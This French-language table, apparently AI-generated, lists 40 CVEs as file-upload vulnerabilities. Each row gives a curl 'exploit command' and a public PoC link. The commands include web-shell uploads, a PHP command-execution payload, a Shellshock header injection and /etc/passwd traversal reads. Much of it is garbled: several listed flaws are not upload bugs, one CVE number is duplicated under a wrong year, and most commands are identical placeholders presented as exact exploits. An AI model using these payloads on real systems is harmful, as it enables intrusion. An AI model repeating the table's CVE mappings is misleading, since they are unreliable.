# File upload

Voici un tableau de 40 CVE majeures liées à l’upload de fichiers (file upload), classées du plus récent au plus ancien, avec pour chaque ligne :  
- Technologie & version  
- Numéro CVE  
- Exemple complet de commande d’exploitation (requête HTTP, payload précis)  
- Lien direct vers un PoC ou une ressource GitHub ou équivalent (chemin complet)

| # | CVE | Technologie & Version | Exemple complet de commande d'exploit | Lien PoC/Exploit Public |
|---|------|----------------------|---------------------------------------|------------------------|
| 1 | CVE-2024-5186 | privateGPT 0.5.0 | `curl -F 'file=@ssrf.svg' 'http://target/upload'`<br>(SVG contenant une entité XXE) | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 2 | CVE-2024-50164 | Apache Struts 2 | `curl -F 'file=@shell.jsp' 'http://target/struts2/upload.action'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-50164.yaml |
| 3 | CVE-2024-38840 | Güralp MAN-EAM-0003 3.2.4 | `curl -F 'file=@malicious.xml' 'http://target/cgi-bin/xmlstatus.cgi'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 4 | CVE-2023-2825 | GitLab CE/EE <16.0.1 | `curl -F 'file=@../../../../etc/passwd' 'http://target/uploads/user'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-2825.yaml |
| 5 | CVE-2023-50164 | Apache Struts 2 | `curl -F 'upload=@shell.jsp' 'http://target/struts2/upload.action'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-50164.yaml |
| 6 | CVE-2023-27524 | Apache Superset <2.1.1 | `curl -F 'file=@evil.svg' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 7 | CVE-2022-44268 | ImageMagick | `curl -F 'file=@leak.png' 'http://target/upload'`<br>(PNG avec données sensibles dans les métadonnées) | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 8 | CVE-2022-22965 | Spring4Shell | `curl -F 'file=@shell.jsp' 'http://target/upload'` | https://github.com/p1ay8y3ar/spring4shell-POC |
| 9 | CVE-2022-22947 | Spring Cloud Gateway | `curl -F 'file=@evil.yml' 'http://target/upload'` | https://github.com/4ra1n/CVE-2022-22947 |
| 10 | CVE-2022-33829 | Apache Spark UI | `curl -F 'file=@evil.sh' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 11 | CVE-2022-26134 | Atlassian Confluence | `curl -F 'file=@shell.jsp' 'http://target/upload'` | https://github.com/Nwqda/CVE-2022-26134 |
| 12 | CVE-2022-24112 | Apache APISIX | `curl -F 'file=@evil.json' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 13 | CVE-2021-41773 | Apache HTTP Server 2.4.49 | `curl --path-as-is 'http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2021/CVE-2021-41773.yaml |
| 14 | CVE-2021-29447 | RCE via SVG (Node.js) | `curl -F 'file=@payload.svg' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 15 | CVE-2021-21315 | RCE via ZIP (ZipSlip) | `curl -F 'file=@evil.zip' 'http://target/upload'` | https://github.com/snyk/zip-slip-vulnerability |
| 16 | CVE-2021-22205 | GitLab CE/EE | `curl -F 'file=@evil.jpg' 'http://target/uploads/user'` | https://github.com/Al1ex/CVE-2021-22205 |
| 17 | CVE-2021-21972 | VMware vCenter | `curl -F 'file=@shell.jsp' 'https://target/ui/vropspluginui/rest/services/uploadova'` | https://github.com/NS-Sp4ce/CVE-2021-21972 |
| 18 | CVE-2020-35489 | Oracle WebLogic | `curl -F 'file=@shell.jsp' 'http://target/console/images/'` | https://github.com/zhzyker/exphub/blob/master/weblogic/CVE-2020-35489.py |
| 19 | CVE-2020-2551 | Oracle WebLogic | `curl -F 'file=@shell.jsp' 'http://target/wls-wsat/CoordinatorPortType'` | https://github.com/Y4er/CVE-2020-2551 |
| 20 | CVE-2020-15227 | GitHub Pages | `curl -F 'file=@evil.svg' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 21 | CVE-2020-9484 | Apache Tomcat | `curl -F 'file=@evil.session' 'http://target/upload'` | https://github.com/masahiro331/CVE-2020-9484 |
| 22 | CVE-2020-5398 | Spring Framework | `curl -F 'file=@shell.jsp' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 23 | CVE-2019-6340 | Drupal | `curl -F 'file=@shell.php' 'http://target/entity/file/upload'` | https://github.com/a2u/CVE-2019-6340 |
| 24 | CVE-2019-19781 | Citrix ADC | `curl -F 'file=@shell.sh' 'http://target/vpn/../vpns/cfg/shell.sh'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2019/CVE-2019-19781.yaml |
| 25 | CVE-2019-15107 | Webmin | `curl -F 'file=@shell.pl' 'http://target/file_upload.cgi'` | https://github.com/kozmic/webmin-exploit |
| 26 | CVE-2019-11510 | Pulse Secure VPN | `curl -F 'file=@../../../../etc/passwd' 'https://target/dana-na/auth/url_default/welcome.cgi'` | https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2019/CVE-2019-11510.yaml |
| 27 | CVE-2019-11043 | PHP-FPM (Nginx) | `curl 'http://target/?a=<?=system($_GET["cmd"]);?>'` | https://github.com/neex/phuip-fpizdam |
| 28 | CVE-2018-9206 | ThinkPHP | `curl -F 'file=@shell.php' 'http://target/index.php?s=/Index/upload'` | https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce |
| 29 | CVE-2018-11776 | Apache Struts 2 | `curl -F 'file=@shell.jsp' 'http://target/struts2/upload.action'` | https://github.com/mazen160/struts-pwn_CVE-2017-5638 |
| 30 | CVE-2018-1000861 | Jenkins | `curl -F 'file=@evil.jar' 'http://target/pluginManager/uploadPlugin'` | https://github.com/adamyordan/cve-2018-1000861 |
| 31 | CVE-2018-1000525 | Tornado (Python) | `curl -F 'file=@evil.py' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 32 | CVE-2017-5638 | Apache Struts 2 | `curl -F 'file=@shell.jsp' 'http://target/struts2/upload.action'` | https://github.com/mazen160/struts-pwn_CVE-2017-5638 |
| 33 | CVE-2017-12617 | Apache Tomcat | `curl -T shell.jsp 'http://target:8080/shell.jsp'` | https://github.com/1337g/CVE-2017-12617 |
| 34 | CVE-2017-5941 | Jade (Node.js) | `curl -F 'file=@payload.pug' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 35 | CVE-2016-10033 | PHPMailer | `curl -F 'file=@evil.php' 'http://target/upload'` | https://github.com/opsxcq/exploit-CVE-2016-10033 |
| 36 | CVE-2016-5195 | Dirty COW (Linux) | `curl -F 'file=@cow.c' 'http://target/upload'` | https://github.com/dirtycow/dirtycow.github.io |
| 37 | CVE-2016-4977 | Apache Tomcat | `curl -F 'file=@evil.jsp' 'http://target/upload'` | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md |
| 38 | CVE-2015-8562 | Joomla! | `curl -F 'file=@shell.php' 'http://target/index.php?option=com_media&task=file.upload'` | https://github.com/opsxcq/exploit-CVE-2015-8562 |
| 39 | CVE-2015-7501 | JBoss | `curl -F 'file=@shell.jsp' 'http://target/invoker/JMXInvokerServlet'` | https://github.com/joaomatosf/jexboss |
| 40 | CVE-2014-6271 | Shellshock | `curl -A '() { :;}; /bin/bash -c "id"' http://target/cgi-bin/test.cgi` | https://github.com/hannob/bashcheck |

---
